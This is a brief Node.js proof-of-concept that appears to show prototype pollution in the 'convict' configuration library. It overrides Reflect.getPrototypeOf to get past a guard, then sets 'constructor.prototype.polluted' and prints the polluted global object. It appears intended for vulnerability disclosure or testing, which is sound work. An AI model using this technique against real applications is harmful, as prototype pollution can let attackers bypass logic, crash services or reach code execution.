Reflect.getPrototypeOf = () => false;
const convict = require('convict');
let obj = {};
const config = convict(obj);
console.log({}.polluted);
config.set('constructor.prototype.polluted', 'yes');
console.log({}.polluted);